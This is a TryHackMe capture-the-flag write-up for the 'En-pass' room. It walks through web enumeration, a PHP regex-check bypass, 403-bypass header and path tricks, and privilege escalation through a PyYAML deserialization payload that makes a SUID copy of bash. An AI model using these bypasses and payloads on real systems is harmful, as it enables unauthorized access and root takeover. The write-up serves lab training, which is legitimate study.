# 64 - En-pass (403 bypass)

Room Link --> [https://tryhackme.com/room/enpass](https://tryhackme.com/room/enpass)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.222.170 -p- -sV -T4 -T5


```
{% endcode %}

There is some kind of cipher on the images at: [http://10.10.222.170:8001/](http://10.10.222.170:8001/)

```
# ciphers on the images.
Ehvw ri Oxfn!!
U2FkCg==Z

```

The 1st cipher i guessed it was Vigenere cipher, so i used this [site](https://www.boxentriq.com/code-breaking/vigenere-cipher) to bruteforce the key and got the key `ddd` . --> decoded as `best of luck` .

<figure><img src=".gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

`U2FkCg==` - decoded as `Sad` .

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.222.170:8001 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -x txt,db,html,php,js -b 403,404

/index.html
/web
/reg.php
/zip 
/403.php
```
{% endcode %}

#### Dirsearch enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
dirsearch -u http://10.10.222.170:8001/web -x 403,404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 -x 503

# output
/web/resources

# keep going and eventually got the path for question 1
/infoseek
# then 
/configure
# then 
/key
```
{% endcode %}

This lead us to an SSH priv key.

Navigating to `/reg.php` .

<figure><img src=".gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

<pre class="language-php" data-line-numbers><code class="lang-php"><strong>&#x3C;?php
</strong>if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i &#x3C; 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."&#x3C;br>"; 
                }
          
          
          }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";

        
            
            }
            

                    else{

                      echo "  Try Try!!";

                
                    }
          }
        
          else{

            echo "  Try Again!! ";

      
          }     
 
  }


 
?>
</code></pre>

### PHP code review

So this is using regular expression to check if we enter any alphanumeric characters, we will always receive `Try Again!!` so we must enter non-alphanumeric characters to bypass the req exp.

Secondly, after the Reg Exp, the `explode()` function is used to convert our input into an array. Then a for loop that iterates 8 times, performing some checks.&#x20;

So on line 12, the length of the 1st value of what we entered must be equal to 2 and  also the length of the 9th value we entered must be equal to 3. Then we enter the "if block" and the next one starts checking.

On line 14, the value of the 5th item in the array must not be equal to  the 8th item, same applies to 3rd and 7th.

After testing i tried `!@,#,$,$,%,^,&&,**,(((,)` and it worked.

<figure><img src=".gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

```
Nice. Password : cimihan_are_you_here?
```

So seems this is the password for the SSH private key we found.

But there is no username to login with.

#### 403.php

<figure><img src=".gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

### 403 Bypass / 403 page bypass

Bypassing a page with 403 forbidden.

Here are tools for this:

\--> [https://github.com/yunemse48/403bypasser](https://github.com/yunemse48/403bypasser)

\--> [https://github.com/iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403) \[Best]

So i used the one by iamJoker

```bash
┌──(dking㉿dking)-[/opt/bypass-403]
└─$ ./bypass-403.sh http://10.10.222.170:8001/403.php 

403,1123  --> http://10.10.222.170:8001/403.php/
403,1123  --> http://10.10.222.170:8001/403.php/%2e/
403,1123  --> http://10.10.222.170:8001/403.php//.
403,1123  --> http://10.10.222.170:8001/403.php////
403,1123  --> http://10.10.222.170:8001/403.php/.//./
403,1123  --> http://10.10.222.170:8001/403.php/ -H X-Original-URL: 
403,1123  --> http://10.10.222.170:8001/403.php/ -H X-Custom-IP-Authorization: 127.0.0.1
403,1123  --> http://10.10.222.170:8001/403.php/ -H X-Forwarded-For: http://127.0.0.1
403,1123  --> http://10.10.222.170:8001/403.php/ -H X-Forwarded-For: 127.0.0.1:80
403,1123  --> http://10.10.222.170:8001/403.php -H X-rewrite-url: 
403,1123  --> http://10.10.222.170:8001/403.php/%20
403,1123  --> http://10.10.222.170:8001/403.php/%09
403,1123  --> http://10.10.222.170:8001/403.php/?
403,1123  --> http://10.10.222.170:8001/403.php/.html
403,1123  --> http://10.10.222.170:8001/403.php//?anything
403,1123  --> http://10.10.222.170:8001/403.php/#
403,1123  --> http://10.10.222.170:8001/403.php/ -H Content-Length:0 -X POST
403,1123  --> http://10.10.222.170:8001/403.php//*
403,1123  --> http://10.10.222.170:8001/403.php/.php
403,1123  --> http://10.10.222.170:8001/403.php/.json
405,303  --> http://10.10.222.170:8001/403.php/  -X TRACE
403,1123  --> http://10.10.222.170:8001/403.php/ -H X-Host: 127.0.0.1
200,917  --> http://10.10.222.170:8001/403.php/..;/
000,0  --> http://10.10.222.170:8001/403.php/;/
405,303  --> http://10.10.222.170:8001/403.php/ -X TRACE
Way back machine:
{
  "available": null,
  "url": null
}
```

And we got a hit: [http://10.10.222.170:8001/403.php/..;/](http://10.10.222.170:8001/403.php/..;/)

<figure><img src=".gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

A possible username: `imsau` .

And we are in on SSH

<figure><img src=".gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

&#x20;I found a script directory on /opt.

<figure><img src="https://miro.medium.com/v2/resize:fit:424/1*gdpq1mg_kl6brMaDKpVI9w.png" alt="" height="430" width="561"><figcaption></figcaption></figure>

It loads the content of file **/tmp/file.yml** and passes to **yaml.load()** function.

This means that we can create a file called /tmp/file.yml with arbitary content and this content will be passed to yaml.load() function. I checked online and found that this can be used to execute code on the box. This can be visualized as desearialization of untrusted user input.

Even though this code was vulnerable, we must be somehow able to execute this script as root.

Uploading pspy to the box, and saw a cronjob running as root.

<figure><img src="https://miro.medium.com/v2/resize:fit:529/1*SRXmDmjQphtt1DVNitIXaw.png" alt="" height="103" width="700"><figcaption></figcaption></figure>

We can notice few things on this image. There is a cronjob which is being executed by root every minute. It executes the script **/opt/scripts/file.py**, removes the file **/tmp/file.yml,** changes the owner of the file **/tmp/file.yml** and again executes and deletes it. It’s kind of strange to be honest. But what we can do is make a file with our malicious payload and run a infinite loop which copies this malicious payload to **/tmp/file.yml.**

#### Content of shell.yml <a href="#0d03" id="0d03"></a>



<figure><img src="https://miro.medium.com/v2/resize:fit:448/1*9q3EKbb3y2iHjxxR4ul-HA.png" alt="" height="127" width="593"><figcaption></figcaption></figure>

We just set the SUID bit on the /bin/bash binary.

[Source](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load\(input\)-Deprecation)

So we create a file.yml file in the /tmp dir with a bash cmd.

{% code overflow="wrap" %}
```bash
echo '!!python/object/new:os.system ["cp /bin/bash /tmp; chmod 4777 /tmp/bash"]' > file.yml
```
{% endcode %}

<figure><img src=".gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

Done!

